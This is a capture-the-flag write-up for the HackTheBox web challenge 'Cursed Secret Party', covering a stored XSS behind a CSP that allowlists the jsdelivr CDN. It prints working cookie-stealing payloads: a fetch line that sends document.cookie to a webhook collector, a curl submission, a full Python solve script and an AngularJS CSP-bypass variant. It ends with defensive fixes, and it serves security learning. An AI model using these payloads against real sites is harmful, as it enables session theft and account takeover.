---
title: "Cursed Secret Party"
date: 2026-11-12 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, xss, csp, csp-bypass, jsdelivr, angularjs, jwt, cwe-693, cwe-79]
description: "A Very Easy Web challenge whose name spells CSP. A strong-looking Content-Security-Policy still allowlists a public CDN in script-src — which makes it equivalent to script-src *. Load attacker JS through jsdelivr, read the admin bot's non-HttpOnly JWT cookie, and the flag falls out of the token."
---

## Overview

`Cursed Secret Party` is a Very Easy HackTheBox **Web** challenge — and the name's initials spell **CSP**. A Halloween party-signup app renders one field with template autoescaping turned off ([stored XSS](https://cwe.mitre.org/data/definitions/79.html)), and an "admin" headless browser reviews submissions. Its session cookie is a JWT that carries the flag as a plaintext claim and is set **without `HttpOnly`**. A Content-Security-Policy is meant to stop the XSS — but it allowlists a public CDN in `script-src`, which is a [protection-mechanism failure](https://cwe.mitre.org/data/definitions/693.html): we load our own JavaScript through that CDN, read `document.cookie`, and exfiltrate the token.

## The technique

From the provided source, the bug surface is small and precise:

- `views/admin.html` renders `{{ request.halloween_name | safe }}`. The Nunjucks `| safe` filter disables HTML escaping, so our `halloween_name` value is injected **raw** into the admin page = stored XSS. (Every other field is escaped.)
- `routes/index.js` — `POST /api/submit` stores the request and then calls `bot.visit()`.
- `bot.js` — the admin bot signs `jwt.sign({username:'admin', user_role:'admin', flag})` and sets it as the `session` cookie with **no `httpOnly` flag**, then visits `/admin`. So the flag rides inside a cookie that JavaScript can read.
- `index.js` CSP: `script-src 'self' https://cdn.jsdelivr.net` — no `'unsafe-inline'`, no `'unsafe-eval'`, and crucially **no `default-src` and no `connect-src`**.

Inline `<script>` and `onerror=` handlers are blocked (no `'unsafe-inline'`). But `script-src` trusts **cdn.jsdelivr.net**, a public CDN that will serve **any** GitHub repo (`/gh/<user>/<repo>@<ref>/file.js`) or npm package. That turns the allowlist into an effective `script-src *` — we just host our payload on GitHub and load it.

Exfiltration is unrestricted because the policy never set `default-src` or `connect-src`, so `fetch()` to any host is allowed (the `img-src 'self'` / `form-action 'self'` locks don't apply to `fetch`).

## Solution

Host a one-line payload on a public GitHub repo (served via jsdelivr):

`p.js`:

```js
fetch('https://<your-webhook>/?c=' + encodeURIComponent(document.cookie));
```

Submit the party request with the CDN-loaded script as the XSS payload — this fires the admin bot:

```bash
curl -s -X POST "http://<target>:<port>/api/submit" \
  --data-urlencode 'halloween_name=<script src="https://cdn.jsdelivr.net/gh/<user>/<repo>@main/p.js"></script>' \
  --data 'email=a@a.a&costume_type=ghost&trick_or_treat=trick'
```

The admin browser loads `/admin`, our script runs **on the trusted origin**, reads the flag-bearing JWT cookie, and beacons it to the collector. Decode the JWT **body** (middle segment, base64url) — the `flag` claim is plaintext, no signing key required:

```
session=eyJ...  ->  {"username":"admin","user_role":"admin","flag":"HTB{...}","iat":...}
```

The full solve (`solve.py`) submits the payload, polls the webhook for the exfiltrated cookie, and decodes the token:

```python
import sys, time, requests, base64, json, re

TARGET  = sys.argv[1]   # http://<host>:<port>
WH_UUID = sys.argv[2]   # webhook.site token uuid
COLLECT = f"https://webhook.site/{WH_UUID}/?c="

# attacker JS (hosted on github, served via the CSP-allowlisted jsdelivr CDN) reads document.cookie
payload = f'<script src="https://cdn.jsdelivr.net/gh/<user>/<repo>@main/p.js"></script>'

requests.post(f"{TARGET}/api/submit",
              data={"halloween_name": payload, "email": "a@a.a",
                    "costume_type": "ghost", "trick_or_treat": "trick"}, timeout=20)

api, cookie = f"https://webhook.site/token/{WH_UUID}/requests?sorting=newest", None
for _ in range(20):
    time.sleep(3)
    for req in requests.get(api, timeout=15).json().get("data", []):
        val = (req.get("query") or {}).get("c")
        if val and "session" in val:
            cookie = val; break
    if cookie: break

tok = re.sub(r".*session=", "", requests.utils.unquote(cookie)).split(";")[0]
body = tok.split(".")[1]; body += "=" * (-len(body) % 4)
print("FLAG:", json.loads(base64.urlsafe_b64decode(body))["flag"])
```

Running it against the live instance prints the flag (`HTB{...}` — redacted here).

### No-GitHub variant (worth knowing)

If you can't publish your own JS, load **AngularJS from the same CDN** and abuse its expression engine — no attacker file host, and it works even though the CSP has no `'unsafe-eval'`:

```html
<script src="https://cdn.jsdelivr.net/npm/angular@1.8.3/angular.min.js"></script>
<div ng-app ng-csp>
  <input autofocus ng-focus="$event.view.fetch('https://<collector>/?c='+$event.view.document.cookie)">
</div>
```

- AngularJS ≥ 1.6 removed the expression sandbox, so expressions can reach real objects.
- Angular evaluates expressions with its **own interpreter** (not `eval`/`Function`), so a missing `'unsafe-eval'` doesn't block it.
- `$event.view` inside a focus handler **is `window`**, giving `$event.view.fetch(...)` and `$event.view.document.cookie` with no global-reaching gadget; `autofocus` fires `ng-focus` on the bot's page load.

## Why it worked

A CSP with no `'unsafe-inline'` looks strong, but a single public-CDN origin in `script-src` undoes it — jsdelivr/unpkg/cdnjs all serve arbitrary user content, so allowlisting one is equivalent to allowing every script source. The missing `connect-src`/`default-src` then left the exfil channel wide open. And the cookie's secrecy depended on the `HttpOnly` flag, not on the JWT being signed — the flag was a readable claim the whole time.

## Fix / defense

- Pin `script-src` to **specific first-party files + Subresource Integrity (SRI) hashes**, never a whole CDN origin. If a CDN is unavoidable, allowlist one immutable, versioned file path.
- Set `default-src 'none'` and an explicit `connect-src` so `fetch`/XHR/WebSocket exfil is restricted too.
- Mark session cookies `HttpOnly` + `SameSite`; never store secrets as readable JWT claims.
- Don't disable template autoescaping (`| safe` / `|raw`) on user-controlled input.
